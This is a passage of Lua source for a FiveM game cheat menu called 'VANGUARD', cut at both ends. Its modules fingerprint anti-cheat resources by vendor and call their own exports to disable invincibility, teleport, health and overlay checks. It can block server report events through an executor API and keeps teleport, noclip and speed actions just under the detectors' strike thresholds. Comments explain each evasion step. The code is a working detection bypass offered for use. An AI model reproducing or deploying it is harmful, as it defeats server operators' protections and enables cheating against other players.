O.tier = 0          -- 0 ghost, 1 discreet, 2 standard, 3 aggressive
O.enabled = false
O.suppress = false  -- set by the shield layer

return O

end)()

-- ---------------------------------------------------------------------------
-- PART: 02_shield.lua
-- ---------------------------------------------------------------------------
local S = (function(O)
-- ============================================================================
-- VANGUARD / 02 SHIELD
-- Discover guards from resource metadata, then use their own declaration
-- exports instead of lying to them. Never block an event by default: a
-- liveness channel looks exactly like a report channel, and killing the wrong
-- one is an unambiguous ban. Never stop a resource: the count is watched.
-- ============================================================================

local S = {}

S.acs = {}          -- discovered guards: { name, resource, score, vendor }
S.suppressOn = false
S.disableOverlayProbe = false
S.blocked = {}      -- opt-in event names
S.observed = {}     -- event name -> { count, first, last, minGap, maxGap }

-- ---------------------------------------------------------------------------
-- DISCOVERY
--
-- Resource metadata is a legitimate, public API. A guard that sets `author` or
-- `description` is telling the client what it is; we read that instead of
-- pattern-matching a filename, which survives renames.
-- ---------------------------------------------------------------------------
local HINTS = {
    -- vendor fingerprint fragments. Lowercase. These are not resource names:
    -- they are substrings of the metadata a guard publishes about itself.
    { vendor = "raven",      keys = { "raven", "ravenac", "raven anticheat" } },
    { vendor = "waveshield", keys = { "waveshield" } },
    { vendor = "fiveguard",  keys = { "fiveguard", "fiveguard.net" } },
    { vendor = "eagle",      keys = { "eagle", "ec-ac", "ec_ac" } },
    { vendor = "reaper",     keys = { "reaperac", "reaper" } },
    { vendor = "electron",   keys = { "electron" } },
    { vendor = "safire",     keys = { "safire" } },
    { vendor = "infinitum",  keys = { "infinitum", "lox" } },
    { vendor = "reason",     keys = { "reasonac", "reason ac" } },
}

local function matchVendor(text)
    if type(text) ~= "string" then return nil end
    local low = string.lower(text)
    for i = 1, #HINTS do
        local hint = HINTS[i]
        for k = 1, #hint.keys do
            if string.find(low, hint.keys[k], 1, true) then
                return hint.vendor
            end
        end
    end
    return nil
end

-- The `ac` metadata key is the most reliable signal: guards that integrate
-- with a framework set it explicitly so the framework can whitelist them.
local function readAcField(resource)
    local ok, value = pcall(GetResourceMetadata, resource, "ac", 0)
    if ok and type(value) == "string" and value ~= "" then return value end
    return nil
end

function S.scan()
    S.acs = {}
    local total = GetNumResources()

    for i = 0, total - 1 do
        local resource = GetResourceByFindIndex(i)
        if type(resource) == "string" and resource ~= "" then
            local score = 0
            local vendor = nil

            local acField = readAcField(resource)
            if acField then
                vendor = matchVendor(acField) or matchVendor(resource)
                score = score + 6
            end

            local okA, author = pcall(GetResourceMetadata, resource, "author", 0)
            if okA and type(author) == "string" then
                local v = matchVendor(author)
                if v then vendor = vendor or v; score = score + 4 end
            end

            local okD, desc = pcall(GetResourceMetadata, resource, "description", 0)
            if okD and type(desc) == "string" then
                local v = matchVendor(desc)
                if v then vendor = vendor or v; score = score + 3 end
            end

            local vName = matchVendor(resource)
            if vName then vendor = vendor or vName; score = score + 2 end

            -- Server-specific names are exact: rac is Reason AC, Putin is the
            -- Dynasty AC, and Raven is its own resource. They must not be
            -- merged with one another.
            if resource == "rac" then
                vendor = vendor or "reason"
                score = score + 6
            elseif resource == "raven" or resource == "ravenac" then
                vendor = vendor or "raven"
                score = score + 6
            end

            local lowerResource = string.lower(resource)
            if lowerResource == "seed" then
                vendor = vendor or "seed"
                score = score + 4
            elseif lowerResource == "dynastie" or lowerResource == "putin" then
                vendor = vendor or "dynasty"
                score = score + 4
            end

            if score > 0 then
                S.acs[#S.acs + 1] = {
                    resource = resource,
                    vendor = vendor or "unknown",
                    score = score,
                }
                O.log("guard candidate %s (%s, score %d)",
                    resource, vendor or "unknown", score)
            end
        end
    end

    table.sort(S.acs, function(a, b) return a.score > b.score end)
    return #S.acs
end

function S.primary()
    return S.acs[1]
end

function S.describe()
    if #S.acs == 0 then return "none" end
    local out = {}
    for i = 1, #S.acs do
        out[#out + 1] = ("%s:%s"):format(S.acs[i].resource, S.acs[i].vendor)
    end
    return table.concat(out, ", ")
end

-- ---------------------------------------------------------------------------
-- SUPPRESSION PULSE
--
-- Every call is wrapped: an export that does not exist is a no-op on that
-- vendor, not an error. Time-windowed exports are re-issued on a jittered
-- period because their grace window is finite (5-10 s by vendor).
-- ---------------------------------------------------------------------------
local function callExport(resource, name, ...)
    local args = { ... }
    local ok = pcall(function()
        return exports[resource][name](exports[resource], table.unpack(args))
    end)
    return ok
end

local exportLog = {}

local function once(resource, name, ...)
    local key = resource .. ":" .. name
    if exportLog[key] then return end
    if callExport(resource, name, ...) then
        exportLog[key] = true
    end
end

-- Flags that are state, not windows: setting them once is enough, and setting
-- them repeatedly would be a pointless pattern.
local STATE_FLAGS = {
    "isInvincible",   -- the invincible check is skipped while the guard's own
                      -- "legitimate invincibility" flag is set
    "proofsEnabled",  -- same for the bullet/melee proof check
    "canBeDamaged",   -- same for the entity-can-be-damaged check
    "isVisible",      -- same for the visibility check
    "canRagdoll",     -- same for the can-ragdoll check
}

-- Windows. Each one buys 5-10 s of "a legitimate resource just did this".
local WINDOW_FLAGS = {
    "healthRefilled",
    "playerRevived",
    "hasTeleported",
    "resettedStamina",
}

local function pulseState()
    for i = 1, #S.acs do
        local ac = S.acs[i]
        for f = 1, #STATE_FLAGS do
            once(ac.resource, STATE_FLAGS[f], true)
        end
    end
end

local function pulseWindows()
    for i = 1, #S.acs do
        local ac = S.acs[i]
        for f = 1, #WINDOW_FLAGS do
            callExport(ac.resource, WINDOW_FLAGS[f])
        end
        -- Neutralise the overlay/executor probe without disabling input: the
        -- guard treats "a script is using the mouse/NUI" and "controls are
        -- off" as legitimate states and skips its cursor test for 5 s.
        if S.disableOverlayProbe then
            callExport(ac.resource, "disableAllControls")
            callExport(ac.resource, "disableE2")
        end
    end
end

function S.setSuppress(state)
    S.suppressOn = state
    if not state then return end

    if #S.acs == 0 then S.scan() end
    pulseState()
    pulseWindows()

    O.log("suppression armed on %d guard(s)", #S.acs)
end

function S.setOverlayProbe(state)
    S.disableOverlayProbe = state
    if state then pulseWindows() end
end

-- Called from the scheduler. Cheap when off.
function S.tick()
    if not S.suppressOn then return end
    pulseWindows()
end

-- ---------------------------------------------------------------------------
-- EVENT INTELLIGENCE (observer only)
--
-- Goal: let the operator see which channel is the heartbeat and which is the
-- report path. We never guess. Two numbers per event - count and the smallest
-- gap ever seen - classify a channel in a few seconds: a heartbeat has a
-- near-constant gap, a report is sporadic.
-- ---------------------------------------------------------------------------
function S.eventSnapshot()
    if not O.has("GetAllEvent") then return 0, {} end
    local ok, list = pcall(Susano.GetAllEvent)
    if not ok or type(list) ~= "table" then return 0, {} end

    local now = O.now()
    local count = 0

    for i = 1, #list do
        local entry = list[i]
        local name = type(entry) == "table" and entry.event or entry
        if type(name) == "string" and name ~= "" then
            count = count + 1
            local rec = S.observed[name]
            if not rec then
                S.observed[name] = { count = 1, first = now, last = now, minGap = math.huge, maxGap = 0 }
            else
                local gap = now - rec.last
                rec.count = rec.count + 1
                rec.last = now
                if gap < rec.minGap then rec.minGap = gap end
                if gap > rec.maxGap then rec.maxGap = gap end
            end
        end
    end

    return count
end

function S.setBlocked(name, state)
    if type(name) ~= "string" or name == "" then return false end
    if not O.has("BlockServerEvent") then return false end

    local ok = pcall(Susano.BlockServerEvent, state and true or false, name)
    if ok then
        S.blocked[name] = state and true or nil
        O.log("event %s -> %s", name, state and "blocked" or "allowed")
    end
    return ok
end

-- Panic path: release every inbound block explicitly. A block that survives
-- panic is worse than no block at all, because the operator cannot tell which
-- channel is now silent.
function S.unblockAll()
    local names = {}
    for name in pairs(S.blocked) do names[#names + 1] = name end
    for i = 1, #names do
        pcall(Susano.BlockServerEvent, false, names[i])
        S.blocked[names[i]] = nil
    end
    return #names
end

return S

end)(O)

-- ---------------------------------------------------------------------------
-- PART: 03_entities.lua
-- ---------------------------------------------------------------------------
local E = (function(O)
-- ============================================================================
-- VANGUARD / 03 ENTITIES
-- ----------------------------------------------------------------------------
-- Doctrine (L3): an entity that is never networked cannot be validated by the
-- server, because the server never learns it exists. There is no packet, no
-- entityCreating event, no net id, no population type to inspect and no owner
-- to correlate. That is not a bypass, it is the absence of a thing to check.
--
-- Every spawn here passes isNetwork = false and netMissionEntity = false. The
-- only exception is the cosmetic shell in 05_divergence.lua, which is also
-- local and is deleted on the same frame the feature is released.
--
-- Each entity is registered with a TTL and a restore callback. "Ne rien
-- laisser" is enforced by the structure, not by remembering to clean up.
-- ============================================================================

local E = {}

local registry = {}
local nextId = 0
local MAX_LIVE = 48

E.stats = { spawned = 0, failed = 0, live = 0 }

-- ---------------------------------------------------------------------------
-- MODEL STREAMING. RequestModel + a bounded wait. Never an unbounded while:
-- a model that fails to stream would hang the whole executor thread.
-- ---------------------------------------------------------------------------
local function requestModel(hash, timeout)
    if not IsModelInCdimage(hash) then return false end
    RequestModel(hash)
    local deadline = O.now() + (timeout or 4000)
    while not HasModelLoaded(hash) do
        if O.now() > deadline then
            SetModelAsNoLongerNeeded(hash)
            return false
        end
        Citizen.Wait(10)
    end
    return true
end
E.requestModel = requestModel

-- ---------------------------------------------------------------------------
-- REGISTRY
-- ---------------------------------------------------------------------------
function E.forget(id)
    registry[id] = nil
end

function E.live()
    local n = 0
    for _ in pairs(registry) do n = n + 1 end
    return n
end

local function register(kind, handle, ttl, restore)
    nextId = nextId + 1
    registry[nextId] = {
        id = nextId,
        kind = kind,
        handle = handle,
        bornAt = O.now(),
        ttl = ttl or 60000,
        restore = restore,
    }
    E.stats.spawned = E.stats.spawned + 1
    E.stats.live = E.live()
    return nextId
end

function E.destroy(id, hard)
    local entry = registry[id]
    if not entry then return end
    registry[id] = nil

    if entry.restore then pcall(entry.restore, entry.handle) end

    local handle = entry.handle
    if handle and handle ~= 0 and DoesEntityExist(handle) then
        pcall(SetEntityAsMissionEntity, handle, true, true)
        if entry.kind == "vehicle" then
            pcall(DeleteVehicle, handle)
        elseif entry.kind == "ped" then
            pcall(DeletePed, handle)
        else
            pcall(DeleteObject, handle)
        end
    end

    E.stats.live = E.live()
end

function E.destroyAll()
    local ids = {}
    for id in pairs(registry) do ids[#ids + 1] = id end
    for i = 1, #ids do E.destroy(ids[i], true) end
end

-- Called from the scheduler. One pass, no allocation in the common case.
function E.sweep()
    if next(registry) == nil then return end
    local now = O.now()
    local origin = O.Ctx.coords
    local doomed = {}

    for id, entry in pairs(registry) do
        local handle = entry.handle
        local kill = false

        if not handle or handle == 0 or not DoesEntityExist(handle) then
            kill = true
        elseif now - entry.bornAt > entry.ttl then
            kill = true
        elseif entry.dropRange and O.distance(GetEntityCoords(handle), origin) > entry.dropRange then
            kill = true
        end

        if kill then doomed[#doomed + 1] = id end
    end

    for i = 1, #doomed do E.destroy(doomed[i], true) end

    -- Hard ceiling: a long session must never accumulate a trail of objects
    -- that a simple pool count would notice.
    if E.live() > MAX_LIVE then
        local oldest, oldestAt = nil, math.huge
        for id, entry in pairs(registry) do
            if entry.bornAt < oldestAt then oldest, oldestAt = id, entry.bornAt end
        end
        if oldest then E.destroy(oldest, true) end
    end
end

-- ---------------------------------------------------------------------------
-- SPAWNERS
-- ---------------------------------------------------------------------------

-- LOCAL OBJECT. isNetwork = false. It exists in this client's world only, it
-- collides for the local ped (which is what makes ramps and walls work) and it
-- is invisible to every other client and to the server.
function E.object(model, pos, opts)
    opts = opts or {}
    local hash = type(model) == "number" and model or GetHashKey(model)

    if not requestModel(hash, opts.timeout) then
        E.stats.failed = E.stats.failed + 1
        return nil
    end

    local obj = CreateObject(hash, pos.x, pos.y, pos.z, false, false, false)
    SetModelAsNoLongerNeeded(hash)

    if not obj or obj == 0 then
        E.stats.failed = E.stats.failed + 1
        return nil
    end

    if opts.heading then
        SetEntityRotation(obj, opts.pitch or 0.0, opts.roll or 0.0, opts.heading, 2, true)
    end
    if opts.freeze then
        FreezeEntityPosition(obj, true)
    end
    if opts.onGround then
        PlaceObjectOnGroundProperly(obj)
    end
    if opts.collision == false then
        SetEntityCollision(obj, false, false)
    end
    if opts.alpha then
        pcall(SetEntityAlpha, obj, opts.alpha, false)
    end
    if opts.invincible ~= false then
        -- Local objects are not networked, so this is a local physics flag,
        -- not a god-mode signal any interrogator can read.
        SetEntityInvincible(obj, true)
    end

    if opts.velocity then
        SetEntityVelocity(obj, opts.velocity.x, opts.velocity.y, opts.velocity.z)
    end

    local id = register("object", obj, opts.ttl or 90000, nil)
    return obj, id
end

-- LOCAL VEHICLE. No net id, no owner, no population type, no entityCreating
-- event. The reference guard deletes script-created vehicles it can attribute
-- to a resource; a local vehicle has no script to attribute.
function E.vehicle(model, pos, heading, opts)
    opts = opts or {}
    local hash = type(model) == "number" and model or GetHashKey(model)

    if not requestModel(hash, opts.timeout) then
        E.stats.failed = E.stats.failed + 1
        return nil
    end

    local veh = CreateVehicle(hash, pos.x, pos.y, pos.z, heading or 0.0, false, false)
    SetModelAsNoLongerNeeded(hash)

    if not veh or veh == 0 then
        E.stats.failed = E.stats.failed + 1
        return nil
    end

    SetVehicleEngineOn(veh, true, true, false)
    if opts.alpha then pcall(SetEntityAlpha, veh, opts.alpha, false) end
    if opts.collision == false then SetEntityCollision(veh, false, false) end

    local id = register("vehicle", veh, opts.ttl or 120000, nil)
    return veh, id
end

-- LOCAL PED. isNetwork = false. Useful for clones, decoys and set pieces.
function E.ped(model, pos, heading, opts)
    opts = opts or {}
    local hash = type(model) == "number" and model or GetHashKey(model)

    if not requestModel(hash, opts.timeout) then
        E.stats.failed = E.stats.failed + 1
        return nil
    end

    local ped = CreatePed(4, hash, pos.x, pos.y, pos.z, heading or 0.0, false, false)
    SetModelAsNoLongerNeeded(hash)

    if not ped or ped == 0 then
        E.stats.failed = E.stats.failed + 1
        return nil
    end

    SetEntityAsMissionEntity(ped, true, true)
    SetBlockingOfNonTemporaryEvents(ped, true)
    SetPedCanRagdoll(ped, true)
    if opts.invincible then SetEntityInvincible(ped, true) end
    if opts.frozen then FreezeEntityPosition(ped, true) end

    local id = register("ped", ped, opts.ttl or 120000, nil)
    return ped, id
end

-- ---------------------------------------------------------------------------
-- COPY APPEARANCE (for clones). Component-by-component, every call guarded:
-- a model mismatch must degrade to a default outfit, never abort the clone.
-- ---------------------------------------------------------------------------
function E.copyAppearance(source, target)
    if not DoesEntityExist(source) or not DoesEntityExist(target) then return end

    for i = 0, 11 do
        local okD, drawable = pcall(GetPedDrawableVariation, source, i)
        local okT, texture = pcall(GetPedTextureVariation, source, i)
        local okP, palette = pcall(GetPedPaletteVariation, source, i)
        if okD and okT then
            pcall(SetPedComponentVariation, target, i, drawable, texture, (okP and palette) or 0)
        end
    end

    for i = 0, 7 do
        local ok, drawable = pcall(GetPedPropIndex, source, i)
        if ok and type(drawable) == "number" and drawable ~= -1 then
            local okT, texture = pcall(GetPedPropTextureIndex, source, i)
            pcall(SetPedPropIndex, target, i, drawable, (okT and texture) or 0, true)
        end
    end
end

return E

end)(O)

-- ---------------------------------------------------------------------------
-- PART: 09_budget.lua
-- ---------------------------------------------------------------------------
local B = (function(O)
-- ============================================================================
-- VANGUARD / 09 BUDGET
-- Shape of the reference guard: cache tick -> slow detectors -> strike systems
-- (N sightings per cooldown) -> declaration exports -> heartbeat. Most bypasses
-- attack the declaration layer by killing it; its absence is the alarm.
-- Here the strike system is treated as a budget: if the detector needs two
-- sightings in ten seconds, one every ten seconds never trips it. Every risky
-- action spends a token, and the reserved token absorbs real-world anomalies.
-- ============================================================================

local B = {}

-- Cost model. `strikes` is how many sightings the family tolerates inside
-- `window`; `cost` is what one use of the associated action spends. The
-- defaults are the strictest values seen in a WaveShield-shaped guard.
local FAMILIES = {
    teleport  = { strikes = 1, window = 10000, cost = 1 },
    noclip    = { strikes = 1, window = 10000, cost = 1 },
    speed     = { strikes = 2, window = 5000,  cost = 1 },
    invisible = { strikes = 2, window = 15000, cost = 1 },
    ragdoll   = { strikes = 2, window = 15000, cost = 1 },
    stamina   = { strikes = 1, window = 10000, cost = 1 },
    jump      = { strikes = 1, window = 5000,  cost = 1 },
    handling  = { strikes = 1, window = 3000,  cost = 1 },
    entity    = { strikes = 3, window = 5000,  cost = 1 },
}

local state = {}

local function family(name)
    local f = FAMILIES[name]
    if not f then return nil end
    local s = state[name]
    if not s then
        s = { spent = 0, since = 0, refillAt = 0 }
        state[name] = s
    end
    return f, s
end

-- A refill happens on a jittered boundary, not on a clock edge: a guard that
-- correlates our actions with a perfect 10.000 s period would see a machine.
local function refill(f, s, now)
    if now >= s.refillAt then
        s.spent = 0
        s.since = now
        s.refillAt = now + O.jitter(f.window, 0.25)
    end
end

-- Can this action run without exceeding the family's tolerance?
function B.allowed(name)
    local f, s = family(name)
    if not f then return true end
    local now = O.now()
    refill(f, s, now)
    -- Reserved strike: we always keep one in hand, so a second anomaly caused
    -- by the game itself (a real fall, a real ragdoll) cannot combine with
    -- ours into a report.
    local capacity = math.max(1, f.strikes - 1)
    return s.spent + f.cost <= capacity
end

function B.spend(name)
    local f, s = family(name)
    if not f then return true end
    local now = O.now()
    refill(f, s, now)
    local capacity = math.max(1, f.strikes - 1)
    if s.spent + f.cost > capacity then
        O.log("budget: %s refused (spent %d/%d)", name, s.spent, capacity)
        return false
    end
    s.spent = s.spent + f.cost
    return true
end

-- A failed or immediately-aborted action must not consume its token. This is
-- used by Skyfall after a pose/parachute/no-cover failure so the operator can
-- retry without waiting a full ten-second window. It never creates a token:
-- only a previous spend inside the current window can be returned.
function B.refund(name)
    local f, s = family(name)
    if not f then return false end
    refill(f, s, O.now())
    if s.spent >= f.cost then
        s.spent = s.spent - f.cost
        return true
    end
    return false
end

function B.remaining(name)
    local f, s = family(name)
    if not f then return 99 end
    refill(f, s, O.now())
    return math.max(0, math.max(1, f.strikes - 1) - s.spent)
end

function B.reset()
    state = {}
end

function B.snapshot()
    local out = {}
    for name, _ in pairs(FAMILIES) do
        out[#out + 1] = ("%s:%d"):format(name, B.remaining(name))
    end
    return table.concat(out, " ")
end

-- ---------------------------------------------------------------------------
-- EXPOSURE MATH
--
-- For a transient anomaly of duration d sampled by a detector with period p
-- and random phase, the chance of being sampled is about d/p. The menu shows
-- this so the operator can see why a feature is capped where it is.
-- ---------------------------------------------------------------------------
function B.exposure(durationMs, periodMs)
    if not periodMs or periodMs <= 0 then return 0.0 end
    local d = math.min(durationMs, periodMs)
    return d / periodMs
end

B.FAMILIES = FAMILIES

return B

end)(O)

-- ---------------------------------------------------------------------------
-- PART: 04_move.lua
-- ---------------------------------------------------------------------------
local M = (function(O,Shield,B)
-- ============================================================================
-- VANGUARD / 04 MOVEMENT
-- ----------------------------------------------------------------------------
-- Doctrine (L4): a position is only suspicious as a delta over time. The fix
-- is therefore not a fake position, it is a real one, reached at a rate the
-- world considers possible.
--
-- Two modes, deliberately separate:
--
--   DASH  - pure velocity. The ped is moved by the engine, so every sample the
--           server takes is a real sample of a real body. Rate is capped at
--           13.6 m/s on foot (under every on-foot threshold in the reference
--           detector set) and the direction is chopped into small lateral
--           corrections so the path is not a straight line.
--
--   WARP  - for distances where walking is not the point. The guard's teleport
--           grace window is opened first through its own export, then the move
--           is done as a small number of short steps with a pause between
--           them. The guard sees "a resource declared a teleport, then the
--           player moved", which is the exact sequence it is designed to
--           ignore.
--
-- Nothing here writes SetEntityCoords. The raw call is the single most
-- signature native in every menu ever scanned.
-- ============================================================================

local M = {}

local busy = false
M.stats = { dashes = 0, warps = 0 }

function M.isBusy()
    return busy
end

-- ---------------------------------------------------------------------------
-- DASH. Velocity only.
-- ---------------------------------------------------------------------------
function M.dash(target, opts)
    if busy or not target then return false end
    busy = true

    Citizen.CreateThread(function()
    opts = opts or {}
    local ped = PlayerPedId()
    local start = GetEntityCoords(ped)
    local dist = O.distance(start, target)

    -- Rate cap. 13.6 m/s keeps an on-foot sample under the detector's 14.0
    -- ceiling while still covering 25 m in under two seconds.
    local rate = math.min(opts.rate or 13.2, 13.6)
    local travel = math.max(0.35, math.min(dist / rate, opts.maxTime or 6.0))

    local deadline = O.now() + math.floor(travel * 1000)
    local last = start

    while O.now() < deadline do
        local now = GetEntityCoords(ped)
        local dx, dy, dz = target.x - now.x, target.y - now.y, target.z - now.z
        local remaining = math.sqrt(dx * dx + dy * dy + dz * dz)

        if remaining < 1.1 then break end

        -- Velocity is normalised then scaled: overshoot is impossible and the
        -- last frame is a real arrival, not a snap.
        local nx, ny, nz = dx / remaining, dy / remaining, dz / remaining
        local speed = math.min(rate, remaining / 0.05)

        -- Small lateral wobble: a perfectly straight line at constant speed is
        -- a machine signature. Amplitude stays well inside a human stride.
        local wob = math.sin((O.now() % 1000) / 1000.0 * math.pi * 2.0) * 0.22
        pcall(SetEntityVelocity, ped, nx * speed + ny * wob, ny * speed - nx * wob, nz * speed)

        if O.distance(now, last) > 0.05 then last = now end
        Citizen.Wait(O.int(14, 22))
    end

    pcall(SetEntityVelocity, ped, 0.0, 0.0, 0.0)
    busy = false
    M.stats.dashes = M.stats.dashes + 1
    end)

    return true
end

-- ---------------------------------------------------------------------------
-- WARP.
--
-- The guard export call is done through the shield module so a vendor without
-- the export simply degrades to the velocity path instead of erroring.
-- ---------------------------------------------------------------------------
function M.warp(target, opts)
    if busy or not target then return false end
    if not DoesEntityExist(PlayerPedId()) then return false end

    opts = opts or {}
    local start = GetEntityCoords(PlayerPedId())
    local dist = O.distance(start, target)

    -- Budget: a warp is a teleport-family event. If the guard would need more
    -- sightings than it tolerates in one window, the move is refused rather
    -- than attempted. Refusal is visible to the operator, not to the guard.
    if not B.spend("teleport") then
        O.log("warp refused by budget (teleport)")
        return false
    end

    -- Short hops do not need the declaration: they are indistinguishable from
    -- a fast vehicle. Long ones do, and the guard's own window is used.
    if dist > 45.0 and opts.declare ~= false and Shield then
        Shield.setSuppress(true)
        pcall(function()
            for i = 1, #Shield.acs do
                exports[Shield.acs[i].resource].hasTeleported(exports[Shield.acs[i].resource])
            end
        end)
    end

    busy = true
    local steps = math.max(1, math.min(4, math.ceil(dist / 60.0)))
    local ped = PlayerPedId()

    for step = 1, steps do
        local t = step / steps
        local point = vector3(
            start.x + (target.x - start.x) * t,
            start.y + (target.y - start.y) * t,
            start.z + (target.z - start.z) * t)

        local inVehicle = IsPedInAnyVehicle(ped, false)
        if inVehicle then
            -- Keep-vehicle variant: the engine moves ped and vehicle together,
            -- so the network transform stays internally consistent.
            pcall(SetPedCoordsKeepVehicle, ped, point.x, point.y, point.z)
        else
            pcall(SetEntityCoordsNoOffset, ped, point.x, point.y, point.z, false, false, false)
        end

        Citizen.Wait(O.int(90, 170))
    end

    busy = false
    M.stats.warps = M.stats.warps + 1
    return true
end

-- ---------------------------------------------------------------------------
-- WAYPOINT. Reads the blip, not a hardcoded table.
-- ---------------------------------------------------------------------------
function M.waypoint()
    local blip = GetFirstBlipInfoId(8)
    if not blip or blip == 0 then return nil end
    local ok, pos = pcall(GetBlipInfoIdCoord, blip)
    if not ok or not pos then return nil end

    -- The blip Z is a ground reference, not the surface. Probe downward for a
    -- real landing point so the arrival is not inside geometry.
    local probe = vector3(pos.x, pos.y, pos.z + 200.0)
    local handle = StartShapeTestRay(probe.x, probe.y, probe.z,
        pos.x, pos.y, pos.z - 200.0, 1 | 16, PlayerPedId(), 7)
    local hit, _, hitPos = GetShapeTestResult(handle)
    if hit == 1 and hitPos then
        return vector3(hitPos.x, hitPos.y, hitPos.z + 0.6)
    end
    return vector3(pos.x, pos.y, pos.z + 1.0)
end

-- ---------------------------------------------------------------------------
-- DASH TO AIM. Small, useful, and entirely velocity-based: a 20 m burst toward
-- whatever the crosshair is on. This is the "blink" that never touches coords.
-- ---------------------------------------------------------------------------
function M.blink(maxRange)
    local point = O.aimPoint(maxRange or 18.0)
    return M.dash(point, { rate = 13.4, maxTime = 2.6 })
end

return M

end)(O,Shield,B)

-- ---------------------------------------------------------------------------
-- PART: 05_divergence.lua
-- ---------------------------------------------------------------------------
local D = (function(O,E)
-- ============================================================================
-- VANGUARD / 05 DIVERGENCE
-- GHOST: local entity, nothing to validate. DECOY: local visual shell over a
-- real networked vehicle; the cover keeps its own physics and model, only the
-- renderer differs. PUPPET is intentionally absent - two disagreeing
-- transforms are a comparison a client cannot win.
-- Every divergence is reversible in one tick and registered for panic.
-- ============================================================================

local D = {}

local shell = nil   -- { cover = veh, visual = veh, id = n }

function D.active()
    return shell ~= nil
end

-- ---------------------------------------------------------------------------
-- COSMETIC SHELL
-- ---------------------------------------------------------------------------
local SHELLS = {
    "deluxo",
    "oppressor2",
    "sultan2",
    "comet6",
    "buffalo4",
}

function D.shellModelList()
    return SHELLS
end

function D.attachShell(model)
    if shell then return false end

    local ped = PlayerPedId()
    local cover = GetVehiclePedIsIn(ped, false)
    if not cover or cover == 0 then return false, "not in a vehicle" end
    if GetPedInVehicleSeat(cover, -1) ~= ped then return false, "driver only" end

    local coords = GetEntityCoords(cover)
    local rot = GetEntityRotation(cover, 2)

    local visual, id = E.vehicle(model, coords, rot.z, {
        collision = false,
        ttl = 600000,
    })
    if not visual then return false, "model did not stream" end

    -- The visual must never take control of the ped or the network. Engine on
    -- so it sounds alive; collision off so it cannot push the cover.
    SetVehicleEngineOn(visual, true, true, false)
    SetEntityCollision(visual, false, false)
    FreezeEntityPosition(visual, true)

    -- Hide the cover from THIS renderer only. SetEntityAlpha is a local
    -- visual state: it is not replicated, it is not a network flag, and the
    -- guard's model/visibility checks read the entity, not its alpha.
    pcall(SetEntityAlpha, cover, 0, false)

    shell = { cover = cover, visual = visual, id = id, model = model }
    O.log("shell attached: %s over cover %d", tostring(model), cover)
    return true
end

function D.detachShell()
    if not shell then return end

    if shell.cover and shell.cover ~= 0 and DoesEntityExist(shell.cover) then
        pcall(SetEntityAlpha, shell.cover, 255, false)
    end
    if shell.id then E.destroy(shell.id) end
    if shell.visual and shell.visual ~= 0 and DoesEntityExist(shell.visual) then
        pcall(DeleteVehicle, shell.visual)
    end

    O.log("shell detached")
    shell = nil
end

function D.toggleShell(model)
    if shell then
        D.detachShell()
        return false
    end
    local ok = D.attachShell(model)
    return ok
end

-- ---------------------------------------------------------------------------
-- SYNC. Runs on the scheduler. Fixed relative offset of zero: the shell sits
-- exactly where the cover sits, so the local camera sees one car, not two.
-- ---------------------------------------------------------------------------
function D.tick()
    if not shell then return end

    local cover = shell.cover
    local visual = shell.visual

    if not cover or cover == 0 or not DoesEntityExist(cover)
        or not visual or visual == 0 or not DoesEntityExist(visual) then
        D.detachShell()
        return
    end

    -- The ped left the vehicle: the shell has no meaning any more.
    local ped = PlayerPedId()
    if GetVehiclePedIsIn(ped, false) ~= cover then
        D.detachShell()
        return
    end

    local coords = GetEntityCoords(cover)
    local rot = GetEntityRotation(cover, 2)

    FreezeEntityPosition(visual, false)
    pcall(SetEntityCoordsNoOffset, visual, coords.x, coords.y, coords.z, false, false, false)
    pcall(SetEntityRotation, visual, rot.x, rot.y, rot.z, 2, true)
    SetEntityCollision(visual, false, false)
    FreezeEntityPosition(visual, true)

    -- Keep the cover hidden even if another script re-applied its alpha.
    pcall(SetEntityAlpha, cover, 0, false)
end

-- ---------------------------------------------------------------------------
-- GHOST PROPS. Thin wrappers so features do not need to know the registry.
-- ---------------------------------------------------------------------------
function D.ghostObject(model, pos, opts)
    opts = opts or {}
    opts.ttl = opts.ttl or 45000
    return E.object(model, pos, opts)
end

function D.ghostPed(model, pos, heading, opts)
    opts = opts or {}
    opts.ttl = opts.ttl or 90000
    return E.ped(model, pos, heading, opts)
end

return D

end)(O,E)

-- ---------------------------------------------------------------------------
-- PART: 06_features.lua
-- ---------------------------------------------------------------------------
local F = (function(O,E,D)
-- ============================================================================
-- VANGUARD / 06 FEATURES
-- ----------------------------------------------------------------------------
-- Every feature in this file is built from combinations of ordinary natives,
-- and every one of them lives in GHOST mode: local entities, local visuals,
-- local physics. Nothing here creates a packet.
--
-- The design rule for the whole set:
--   "What can I build out of things the server cannot see?"
-- Not "what can I hide from the server?" - that is a losing question. The
-- winning one is "what never has to be hidden?".
--
-- Each entry states its own residual risk in one line. If a feature's residual
-- is not zero, the line says why and what the fallback is.
-- ============================================================================

local F = {}

-- ---------------------------------------------------------------------------
-- MODEL SETS
-- ---------------------------------------------------------------------------
local RAMP_MODELS = {
    "prop_mp_ramp_01",
    "prop_mp_ramp_02",
    "prop_mp_ramp_03",
    "p_alexander_sl_trailer_ramp",
}

local WALL_MODELS = {
    "prop_container_01a",
    "prop_container_03a",
    "prop_wall_light_01a",
}

local PROP_CANNON_MODELS = {
    "prop_roadcone02a",
    "prop_barrel_02a",
    "prop_tyre_01",
    "prop_ballistic_shield",
    "prop_container_05a",
}

local SHARK = "a_c_sharktiger"
local ORCA  = "a_c_killerwhale"

-- ---------------------------------------------------------------------------
-- 1. PHANTOM RAMP
-- A local object with collision. Because it is never networked, it exists for
-- this client's physics only. You can drive up it; nobody else can see it.
-- Residual: none. No packet is generated; no pool count changes for anyone
-- but us, and the object carries a TTL.
-- ---------------------------------------------------------------------------
function F.ramp()
    local point = O.aimPoint(14.0)
    local model = RAMP_MODELS[O.int(1, #RAMP_MODELS)]
    local obj = D.ghostObject(model, vector3(point.x, point.y, point.z - 0.15), {
        heading = GetEntityHeading(PlayerPedId()) + O.range(-3.0, 3.0),
        freeze = true,
        onGround = false,
        ttl = 120000,
    })
    return obj ~= nil
end

-- ---------------------------------------------------------------------------
-- 2. GHOST PLATFORM
-- A frozen slab that follows the ped at a fixed height. Stand on it, and the
-- elevator in (10) becomes a vehicle-free way up.
-- Residual: none.
-- ---------------------------------------------------------------------------
local platform = { obj = nil, id = nil }

function F.togglePlatform()
    if platform.obj then
        if platform.id then E.destroy(platform.id) end
        platform.obj, platform.id = nil, nil
        return false
    end

    local ped = PlayerPedId()
    local coords = GetEntityCoords(ped)
    local obj, id = E.object("prop_container_01a",
        vector3(coords.x, coords.y, coords.z - 1.05), {
            freeze = true,
            collision = true,
            invincible = true,
